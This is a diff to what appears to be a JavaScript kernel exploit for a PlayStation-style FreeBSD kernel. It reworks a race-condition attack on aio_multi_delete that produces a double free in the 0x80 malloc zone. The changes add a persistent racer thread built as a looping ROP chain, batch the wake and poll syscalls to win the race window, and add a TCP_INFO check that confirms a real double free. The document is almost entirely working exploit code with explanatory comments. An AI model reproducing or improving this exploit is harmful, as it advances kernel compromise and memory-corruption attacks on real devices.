@@ -55,7 +55,7 @@
 const SYS = {
     accept: 30, getsockname: 32, connect: 98, bind: 104, listen: 106,
     socket: 97, close: 6, setsockopt: 105, getsockopt: 118, thr_new: 455,
-    thr_exit: 431,
+    thr_exit: 431, read: 3, write: 4, pipe2: 687,
     aio_multi_delete: 0x296, aio_multi_wait: 0x297, aio_multi_poll: 0x298,
     aio_multi_cancel: 0x29a, aio_submit_cmd: 0x29d,
 };
@@ -63,6 +63,10 @@ const SYS = {
 const AF_INET = 2, SOCK_STREAM = 1;
 const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
 const TCP_INFO = 0x20, IPPROTO_TCP = 6, TCP_INFO_SIZE = 0xec;
+// struct tcp_info's first byte is tcpi_state. 4 = TCPS_ESTABLISHED, i.e. the
+// connection has NOT started tearing down yet — which means soclose() has not
+// reached sodisconnect and the racer is not parked where we need it.
+const TCPS_ESTABLISHED = 4;
 
 /* 3 requests * sizeof(SceKernelAioRWRequest) = 3 * 0x28 = 0x78, which lands in
  * the 0x80 malloc zone. That sizing is the whole point: the freed entry has to
@@ -169,16 +173,40 @@ function process_aio(op, idsAddr, offset, count) {
 
 /* ---------------------------------------------------------- race thread */
 
-/* cobolt keeps a persistent JS worker parked on a condvar and signals it per
- * attempt. We have no such worker to spare — the one Worker we own is already
- * the ROP host — so each attempt spawns a single-shot thread whose entire
- * program is "call aio_multi_delete once, then thr_exit".
+/* A racer that is ALREADY PARKED IN THE KERNEL, woken per attempt.
  *
- * That is sufficient because the window is not timing-based: SO_LINGER makes
- * the close inside _fdrop() sleep, so the delete parks in the kernel and stays
- * parked while this side polls. Thread spawn latency lands well inside it. */
+ * The first version spawned a fresh thread per attempt and lost every time:
+ * "poll says ESRCH — entry already gone" on 6/6 attempts. thr_new costs a full
+ * ROP round trip (~0.4 ms), and the new thread ran its one syscall to
+ * completion inside that window, so by the time this side issued its poll the
+ * entry was already deleted. cobolt never has that gap — its racer sits on a
+ * condvar and signal_work() wakes it in microseconds.
+ *
+ * So mirror that: spawn ONE thread up front whose chain is
+ *     loop: read(wake_r, 1)            <- blocks in the kernel, ready to go
+ *           aio_multi_delete(...)
+ *           write(done_w, 1)           <- "finished", the wait_for_finished()
+ *           jump back to loop
+ * The loop-back is the same `pop rdi, <addr>; mov rsp, rdi; ret` construct p2jb
+ * uses, because there is still no branch gadget in either module.
+ *
+ * Waking it and polling then go out as ONE batched chain (see the attempt
+ * loop), so they are microseconds apart on the same thread instead of two
+ * round trips. */
+const RACER = { tid: 0n, wake: [0, 0], done: [0, 0], buf: 0n, spawned: false };
+
 function spawnDeleteRacer(idsAddr, outsAddr) {
+    if (RACER.spawned) return RACER;
     const g = gadgets();
+
+    const pb = alloc(8);
+    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(wake)");
+    RACER.wake = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
+    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(done)");
+    RACER.done = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
+    RACER.buf = BigInt(alloc(8));
+    wr64(RACER.buf, 0, 0n);
+
     const chain = alloc(THR_CHAIN_SIZE);
     const stack = alloc(THR_STACK_SIZE);
     const param = alloc(THR_PARAM_SIZE);
@@ -187,14 +215,20 @@ function spawnDeleteRacer(idsAddr, outsAddr) {
 
     let o = 0n;
     const put = (v) => { wr64(chain, o, v); o += 8n; };
-    put(g.pop_rdi); put(BigInt(idsAddr));
-    put(g.pop_rsi); put(1n);
-    put(g.pop_rdx); put(BigInt(outsAddr));
-    put(g.pop_rax); put(BigInt(SYS.aio_multi_delete));
-    put(g.syscall_wrapper);
-    put(g.pop_rax); put(BigInt(SYS.thr_exit));
-    put(g.pop_rdi); put(0n);
-    put(g.syscall_wrapper);
+    const call3 = (num, a1, a2, a3) => {
+        put(g.pop_rdi); put(a1);
+        put(g.pop_rsi); put(a2);
+        put(g.pop_rdx); put(a3);
+        put(g.pop_rax); put(BigInt(num));
+        put(g.syscall_wrapper);
+    };
+
+    const loopHead = BigInt(chain) + o;
+    call3(SYS.read, S(RACER.wake[0]), RACER.buf, 1n);          // park here
+    call3(SYS.aio_multi_delete, BigInt(idsAddr), 1n, BigInt(outsAddr));
+    call3(SYS.write, S(RACER.done[1]), RACER.buf, 1n);         // signal finished
+    put(g.pop_rdi); put(loopHead);
+    put(g.pivot_rdi_rsp);
 
     bzero(param, THR_PARAM_SIZE);
     wr64(param, 0x00, g.pivot_rdi_rsp);     // start_func: rsp := arg
@@ -206,7 +240,17 @@ function spawnDeleteRacer(idsAddr, outsAddr) {
 
     const rv = sc("thr_new", BigInt(param), S(THR_PARAM_SIZE));
     if (rv !== 0) throw new Error("lapse: thr_new(racer) -> " + rv);
-    return tid;
+    RACER.tid = BigInt(tid);
+    RACER.spawned = true;
+    log("racer parked: wake=" + RACER.wake.join("/")
+        + " done=" + RACER.done.join("/"));
+    return RACER;
+}
+
+/* Block until the racer says it finished its delete — cobolt's
+ * race_worker.wait_for_finished(). */
+function waitRacer() {
+    sc("read", S(RACER.done[0]), RACER.buf, S(1));
 }
 
 /* --------------------------------------------------------------- checks */
@@ -267,7 +311,14 @@ function double_free_reqs2() {
     const which = NUM_REQS - 1;
     const idsAddr = ST.ids;
     const idsWhich = BigInt(idsAddr) + BigInt(which * 4);
-    const outs1 = BigInt(ST.outs) + 4n;
+    const outs1 = BigInt(ST.outs) + 4n;    // racer writes its error here
+
+    // TCP_INFO scratch, allocated once: the state byte is read every attempt.
+    const info = alloc(TCP_INFO_SIZE);
+    const infoLen = alloc(4);
+
+    // Park the racer ONCE, before the loop — see spawnDeleteRacer.
+    spawnDeleteRacer(idsWhich, outs1);
 
     for (let attempt = 0; attempt < ATTEMPT_NUM; attempt++) {
         const client = sc("socket", S(AF_INET), S(SOCK_STREAM), 0n);
@@ -288,24 +339,64 @@ function double_free_reqs2() {
         // drop our reference so the racer's delete is the one that _fdrop()s
         sc("close", S(client));
 
-        spawnDeleteRacer(idsWhich, outs1);
-
-        // ...and poll the same entry while the racer is parked in soclose()
-        process_aio(AIO_OP_POLL, idsAddr, which, 1);
+        /* Wake the racer and poll in ONE chain. Two separate syscalls here is
+         * what lost the race every time: each is a ~0.4 ms round trip, and the
+         * delete finished inside the gap. Batched, the poll is issued
+         * microseconds after the wake byte lands, while the racer is still
+         * being scheduled into aio_multi_delete. */
+        wr32(ST.outs, 0x00, 0);
+        wr32(ST.outs, 0x04, 0);
+        rw().syscallBatch([
+            [SYS.write, S(RACER.wake[1]), RACER.buf, 1n],
+            [SYS.aio_multi_poll, idsWhich, 1n, ST.outs],
+        ]);
         const pollErr = rd32(ST.outs, 0);
 
-        sc("close", S(conn));
+        /* The REAL proof, and what the first version was missing.
+         *
+         * A non-ESRCH poll alone means nothing — it only says the entry still
+         * existed. What shows the racer is parked INSIDE soclose() (and so that
+         * two frees are in flight on one entry) is the connection having
+         * already left ESTABLISHED: soclose's SO_LINGER path calls sodisconnect
+         * before it sleeps. cobolt requires both, and without the tcp_state
+         * half every "win" would be a false positive. */
+        wr32(infoLen, 0x00, TCP_INFO_SIZE);
+        const gso = sc("getsockopt", S(conn), S(IPPROTO_TCP), S(TCP_INFO),
+                       BigInt(info), BigInt(infoLen));
+        const tcpState = gso === 0 ? (rd32(info, 0x00) & 0xff) : -1;
 
-        if (pollErr === SCE_KERNEL_ERROR_ESRCH) {
-            log("attempt " + attempt + ": poll says ESRCH — entry already gone,"
-                + " the delete completed first");
-            continue;
+        let won = false;
+        if (pollErr !== SCE_KERNEL_ERROR_ESRCH && tcpState !== TCPS_ESTABLISHED) {
+            // Confirming delete on the same entry — this is the second free.
+            process_aio(AIO_OP_DELETE, idsAddr, which, 1);
+            won = true;
         }
-        if (pollErr === 0) {
-            log("attempt " + attempt + ": WON — poll succeeded on an entry the"
-                + " racer is deleting (double free)");
-            return { ids: idsAddr, which: which, attempt: attempt };
+
+        waitRacer();
+
+        if (won) {
+            /* Both the racer's delete and ours must have returned 0. If either
+             * errored the entry was not freed twice and continuing would spray
+             * against a chunk that is still live. */
+            const e0 = rd32(ST.outs, 0x00), e1 = rd32(ST.outs, 0x04);
+            if (e0 === 0 && e1 === 0) {
+                log("attempt " + attempt + ": WON — poll=" + hex(pollErr)
+                    + " tcp_state=" + tcpState + " errs=0/0 (double free)");
+                process_aio(AIO_OP_DELETE, idsAddr, 0, NUM_REQS);
+                sc("close", S(conn));
+                return { ids: idsAddr, which: which, attempt: attempt };
+            }
+            log("attempt " + attempt + ": race looked won but errs=" + hex(e0)
+                + "/" + hex(e1) + " — not a clean double free");
+        } else {
+            log("attempt " + attempt + ": lost (poll=" + hex(pollErr)
+                + " tcp_state=" + tcpState + ")");
         }
+
+        /* MEMLEAK, as cobolt notes: a won race decrements ao_num_reqs twice and
+         * leaves one request undeleted. Clean up what we can either way. */
+        process_aio(AIO_OP_DELETE, idsAddr, 0, NUM_REQS);
+        sc("close", S(conn));
     }
     throw new Error("lapse: lost the aio double-free race in " + ATTEMPT_NUM
                     + " attempts");
